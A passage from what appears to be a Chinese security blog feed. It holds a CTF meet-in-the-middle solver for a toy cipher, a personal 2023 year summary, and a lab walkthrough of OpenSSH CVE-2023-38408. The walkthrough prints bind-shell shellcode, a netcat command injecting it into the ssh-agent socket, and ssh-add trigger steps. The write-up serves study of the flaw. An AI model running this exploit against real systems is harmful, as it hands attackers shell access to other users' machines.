class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin_to_list</span>(<span class="params">r, bit_len</span>):</span><br><span class="line">    <span class="built_in">list</span> = [r &gt;&gt; d &amp; <span class="number">1</span> <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(bit_len)][::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_to_int</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Pbox=[<span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">16</span>]</span><br><span class="line">rePbox = [<span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>]</span><br><span class="line">Sbox=[<span class="number">14</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">6</span>]</span><br><span class="line">reSbox=[<span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">round_func</span>(<span class="params">X,r,K</span>):</span><br><span class="line">    kstart=<span class="number">4</span>*r - <span class="number">4</span></span><br><span class="line">    XX = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        XX[i] = X[i] ^ K[kstart+i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        value = list_to_int(XX[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        s_value = Sbox[value]</span><br><span class="line">        s_list = bin_to_list(s_value, <span class="number">4</span>)</span><br><span class="line">        XX[<span class="number">4</span>*i],XX[<span class="number">4</span>*i+<span class="number">1</span>],XX[<span class="number">4</span>*i+<span class="number">2</span>],XX[<span class="number">4</span>*i+<span class="number">3</span>] = s_list[<span class="number">0</span>],s_list[<span class="number">1</span>],s_list[<span class="number">2</span>],s_list[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    Y=[<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[Pbox[i]-<span class="number">1</span>]=XX[i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re_round_func4</span>(<span class="params">X,K</span>):</span><br><span class="line">    Y = [<span class="number">0</span>]*<span class="number">16</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[rePbox[i]]=X[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        value = list_to_int(Y[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        s_value = reSbox[value]</span><br><span class="line">        s_list = bin_to_list(s_value, <span class="number">4</span>)</span><br><span class="line">        Y[<span class="number">4</span>*i],Y[<span class="number">4</span>*i+<span class="number">1</span>],Y[<span class="number">4</span>*i+<span class="number">2</span>],Y[<span class="number">4</span>*i+<span class="number">3</span>] = s_list[<span class="number">0</span>],s_list[<span class="number">1</span>],s_list[<span class="number">2</span>],s_list[<span class="number">3</span>]</span><br><span class="line">    kstart =  <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[i] = Y[i] ^ K[kstart+i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re_round_func3</span>(<span class="params">X</span>):</span><br><span class="line">    Y = [<span class="number">0</span>]*<span class="number">16</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[rePbox[i]]=X[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        value = list_to_int(Y[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        s_value = reSbox[value]</span><br><span class="line">        s_list = bin_to_list(s_value, <span class="number">4</span>)</span><br><span class="line">        Y[<span class="number">4</span>*i],Y[<span class="number">4</span>*i+<span class="number">1</span>],Y[<span class="number">4</span>*i+<span class="number">2</span>],Y[<span class="number">4</span>*i+<span class="number">3</span>] = s_list[<span class="number">0</span>],s_list[<span class="number">1</span>],s_list[<span class="number">2</span>],s_list[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">X,K</span>):</span><br><span class="line">    Y = round_func(X,<span class="number">1</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">2</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">3</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">4</span>,K)</span><br><span class="line"></span><br><span class="line">    kstart=<span class="number">4</span>*<span class="number">5</span> - <span class="number">4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[i] ^= K[kstart+i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ss = [[<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">      [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">      [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">      [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XX = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">XX[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> start <span class="keyword">in</span> trange(<span class="number">0</span>,<span class="number">2</span>**<span class="number">20</span>,<span class="number">5000</span>):</span><br><span class="line">    FLAG = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    A = <span class="built_in">dict</span>()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(start,start+<span class="number">5000</span>):</span><br><span class="line">        K = bin_to_list(j,<span class="number">20</span>)</span><br><span class="line">        Y = round_func(XX,<span class="number">1</span>,K)</span><br><span class="line">        Y = round_func(Y,<span class="number">2</span>,K)</span><br><span class="line">        kstart=<span class="number">8</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">            Y[i] = Y[i] ^ K[kstart+i]</span><br><span class="line">        A[<span class="built_in">str</span>(Y[:<span class="number">12</span>])] = K </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    ss = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    flag = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> trange(<span class="number">2</span>**<span class="number">20</span>):</span><br><span class="line">        XXX = ss.copy()</span><br><span class="line">        K = bin_to_list(j,<span class="number">20</span>)</span><br><span class="line">        kstart = <span class="number">4</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            XXX[i] = XXX[i]^K[kstart+i]</span><br><span class="line"></span><br><span class="line">        Y = re_round_func4(XXX,K)</span><br><span class="line">        Y = re_round_func3(Y)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(Y[:<span class="number">12</span>]) <span class="keyword">in</span> A:</span><br><span class="line">            tmpk = A[<span class="built_in">str</span>(Y[:<span class="number">12</span>])][:<span class="number">12</span>]+K[:]</span><br><span class="line">            <span class="keyword">if</span> enc([<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],tmpk) ==  [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>] <span class="keyword">and</span> \</span><br><span class="line">                enc([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],tmpk) == [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>] <span class="keyword">and</span> \</span><br><span class="line">                enc([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],tmpk) == [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>] <span class="keyword">and</span> \</span><br><span class="line">                enc([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],tmpk) == [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[++]&quot;</span>,tmpk)</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;0x01-Not-Wiener&quot;&gt;&lt;a href=&quot;#0x01-Not-Wiener&quot; class=&quot;headerlink&quot; title=&quot;0x</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2023-Summary</title>
    <link href="http://example.com/2023/12/31/2023-Summary/"/>
    <id>http://example.com/2023/12/31/2023-Summary/</id>
    <published>2023-12-31T15:53:25.000Z</published>
    <updated>2023-12-31T17:31:48.711Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>大二下一堆课，学的是依托💩。大三上爽，课少，有更多时间摸鱼。</p><p>送别大四两位毕业的学长师傅。</p><blockquote><p>长亭外，古道边，芳草碧连天<br>晚风拂柳笛声残，夕阳山外山</p><p>天之涯，地之角，知交半零落<br>一瓢浊酒尽余欢，今宵别梦寒</p></blockquote><p>看的书：</p><ul><li><p>《科幻世界》一本没落下，补完了。现在感觉国内中短篇科幻写的就是依托，就连《依尘》这种堆砌文藻、数学公式显得自己很牛逼的东西都端上来了。</p><blockquote><p>不过SFW科幻大会很过瘾，大刘很和蔼一老头，乐呵呵给我签名。</p><p>王诺诺好看捏（抬走） </p></blockquote></li><li><p>《战争与和平》：读到三四百页鸽了，过了一段时间从头读。我就喜欢这味！仿佛身临其境体会人物的喜怒哀乐，一言一行。字里行间更是金句频出。</p><blockquote><p>此生必去一趟俄罗斯，还愿。</p></blockquote></li><li><p>一些论文：就不一一贴了，有的看完有的鸽了，笔记也记的稀稀拉拉，太懒了。</p></li><li><p>技术方面：《Go 语言编程之旅：一起用 Go 做项目》非常好Go，让我的代码力提升。基于这本书和阿鲁师傅的提点，给我出题提供了灵感和技术支撑；《<em>Learn You a Haskell</em>》，用公式写程序，非常优雅上流。</p></li></ul><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">quicksort</span> :: (<span class="type">Ord</span> a) =&gt; [a] -&gt; [a]  </span><br><span class="line"><span class="title">quicksort</span> [] = []  </span><br><span class="line"><span class="title">quicksort</span> (x:xs) =   </span><br><span class="line">    <span class="keyword">let</span> smallerSorted = quicksort [a | a &lt;- xs, a &lt;= x]  </span><br><span class="line">        biggerSorted = quicksort [a | a &lt;- xs, a &gt; x]  </span><br><span class="line">    <span class="keyword">in</span>  smallerSorted ++ [x] ++ biggerSorted  </span><br></pre></td></tr></table></figure><p>走的地方：</p><ul><li>成都：大本营，基本就是学校（学校里寝室-教室-实验室三点一线），经常和群友到北街恰饭，开发了不少好地方。平安SRC讲座+晚宴，讲座都是二进制的东西，挖浏览器的洞太帅了（），其他看不懂（），晚宴丰盛捏。加了长亭的大佬v，问有无内推，答最近没hc。安全行业愁云惨淡。</li><li>北京：去耍的，逛航博。想把阿鲁约出来吃饭，犬安大哥不待见兄弟😭。路上误打误撞闯入奇安信老窝，正值护网阶段，门口四个佬聊技术，给🐭🐭听的一愣一愣的。</li><li>深圳：补天白帽大会。讲座请了y4讲字节码，另外还有山大女博士讲安卓提权，忘了谁讲的开发交互式的二进制漏洞挖掘工具。我带着迷茫去深圳，带着思考、收获、信心回来。</li><li>哈尔滨：哈工大真大，计算机学院有独立的楼，把🐭🐭震惊到了。市区俄味很浓。</li><li>沈阳：到沈阳大街，做大保健。</li><li>丹东：隔着鸭绿江，眺望光之国。</li><li>重庆：父母游母校拉上🐭🐭的。</li></ul><p>我时常回忆起22年打鹏程杯的那个夏天，那时我们打车去赛场，阳光正好，我们满怀对未来的憧憬。如今人走人留，有失有得，让我每每回想无语凝噎。而<strong>2023年</strong>，就像一个长长的假期，上半年紧张的放假，下半年悠闲的放假。我走了很多地方，但真正留在我心底的美景就那么几个；认识了很多人，也因为自身或外部原因与他们断了联系；参与了很多事情，有些搞的好，不过好多还是没搞好。在迷茫中挣扎求变，上下求索就是我2023的最好画像。</p><p>就这样吧，希望<strong>2024</strong>变得更好。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401010131505.png" alt="image-20240101013133418"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;大二下一堆课，学的是依托💩。大三上爽，课少，有更多时间摸鱼。&lt;/p&gt;
&lt;p&gt;送别大四两位毕业的学长师傅。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;长亭外，古道边，芳草碧连天&lt;br</summary>
      
    
    
    
    
    <category term="other" scheme="http://example.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-38408-Brief-analysis</title>
    <link href="http://example.com/2023/12/27/CVE-2023-38408-Brief-analysis/"/>
    <id>http://example.com/2023/12/27/CVE-2023-38408-Brief-analysis/</id>
    <published>2023-12-27T15:56:20.000Z</published>
    <updated>2024-01-27T01:27:57.410Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p><img src="https://iototsecnews.files.wordpress.com/2023/07/openssh.png?w=1008" alt="img"></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>SSH（Secure Shell）是一种加密的网络传输协议。主要用来在客户端和服务器之间建立安全通信隧道。使用SSH进行远程登录，信息传输是加密的，即使信息被中途截获也不会泄露。OpenSSH软件套件负责SSH协议的实现。</p><p>23年七月爆出来OpenSSH(9.3p2版本以前)的一个CVE，用户使用 SSH-Agent 代理转发功能连接攻击者恶意服务器时，由于 SSH-Agent 未对加载的共享库进行限制，攻击者可通过将恶意共享库作为参数传递给 SSH-Agent 并通过其调用 dlopen&#x2F;dlclose 函数加载 &#x2F; 卸载位于用户客户端主机的共享库，实现远程代码执行。</p><p>攻击流程如图：</p><p><img src="https://github.com/LucasPDiniz/CVE-2023-38408/raw/main/img/poc.JPG" alt="img"></p><ul><li>攻击者通过SSH连接到服务器</li><li>Alice也通过SSH连接到服务器，此时Alice使用SSH转发代理连接到攻击者。</li><li>攻击者创建shellcode, 通过ssh进程发送给目标服务器</li><li>shellcode利用ssh-agent的PKCS#11漏洞创建一个新进程，劫持Alice的ssh访问权限</li><li>成功执行该攻击后，攻击者可能会访问绑定shell（shell代码），该shell可以使用netcat进行访问。</li></ul><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>目标：提升redqueenrebel权限，损害alice账户</p><p>机器：</p><ul><li>workstation: 受害者机器</li><li>kali 攻击者机器</li></ul><p>用户：</p><ul><li>redqueenrebel: 非特权用户</li><li>alice: workstation的root用户</li><li>root: hacker</li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>首先我们已经完成攻击的第一、二步，也即两个用户已经有权通过SSH访问服务器。</p><ol><li><p>获取在远程攻击者计算机上运行的 SSH 代理的 PID ，并导出到环境变量。我们还通过 ssh-add 添加了文件 linuxx64.elf.stub（UEFI 引导存根）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> /tmp/ssh-*/agent.*</span><br><span class="line"><span class="built_in">export</span> SSH_AUTH_SOCK=/tmp/ssh-NqLP6il36s/agent.3452</span><br><span class="line">ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401042335331.png" alt="image-20240104233548210"></p><ol start="2"><li><p>通过SSH把 shellcode复制到进程中</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHELLCODE=$<span class="string">&#x27;\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05&#x27;</span></span><br><span class="line">(perl -e <span class="string">&#x27;print &quot;\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6&quot; . &quot;\x90&quot; x 10000&#x27;</span>; <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$SHELLCODE</span>&quot;</span>) | nc -U <span class="string">&quot;<span class="variable">$SSH_AUTH_SOCK</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>一旦 shellcode 成功放入代理内存中，直接按CtrlC，停止 netcat 传输。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401042337741.png" alt="image-20240104233746664"></p><ol start="3"><li><p>通过ssh-add上传：ibttcn3-rt2-dynamic.so、libKF5SonnetUi.so.5.92.0 和 libns3.35-wave.so.0.0.0，触发<strong>SIGSEGV</strong>漏洞。</p><blockquote><p><code>SIGSEGV</code> 是Linux和类Unix系统中的一个信号，它表示”Segmentation Fault”（分段错误）。当一个程序尝试访问未分配给它的内存区域，或者访问已经被释放的内存区域，就会触发 <code>SIGSEGV</code> 信号。收到 SIGSEGV 信号后，内核会识别出发生了无效内存访问，并继续调用自定义信号处理程序，而不是突然终止程序。此时攻击者会操纵程序的执行，并将其引导至位于 NOP 雪橇内的注入恶意代码。</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so</span><br><span class="line">[Enter <span class="keyword">for</span> passphrase]</span><br><span class="line">ssh-add -s /usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0</span><br><span class="line">[Enter <span class="keyword">for</span> passphrase]</span><br><span class="line">ssh-add -s /usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0</span><br><span class="line">[Enter <span class="keyword">for</span> passphrase]</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>成功提Alice的权，映射到端口31337上。</p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401042352811.png" alt="image-20240104235222726" style="zoom: 50%;" /></li></ol><h2 id="PS1-nop-sled"><a href="#PS1-nop-sled" class="headerlink" title="PS1 nop-sled"></a>PS1 nop-sled</h2><p>nop是一条不做任何操作的单指令，对应的十六进制编码为0x90。这里nop将被用作欺骗因子。通过创建一个大的NOP指令数组并将其放在shellcode之前，如果EIP返回到存储nop sled的任意地址，那么在达到shellcode之前，每执行一条nop指令，EIP都会递增。这就是说只要返回地址被nop sled中的某一地址所重写，EIP就会将sled滑向将正常执行的shellcode。<br>以一个简单程序的pwn解释：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401052031291.png" alt="image-20240105203131190"></p><p>32位，canary保护开了，但没开NX和PIE，所以还是可以把shellcode写到栈上执行的。</p><p>反汇编main函数时报错：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401052122346.png" alt="image-20240105212226312"></p><p>由于F5在分析调用时，未能成功解析参数位置&#x2F;参数个数，<br>解决方法：就是先undefine掉函数，在右键现在code,之后Creat function 就可以正常反编译了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> (*v5)(<span class="type">void</span>); <span class="comment">// [esp+0h] [ebp-1010h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [esp+4h] [ebp-100Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [esp+1004h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v8; <span class="comment">// [esp+1008h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> savedregs; <span class="comment">// [esp+1010h] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  v8 = &amp;argc;</span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  logo();</span><br><span class="line">  srand((<span class="type">unsigned</span> <span class="type">int</span>)&amp;seed);</span><br><span class="line">  Loading();</span><br><span class="line">  acquire_satellites();</span><br><span class="line">  v3 = 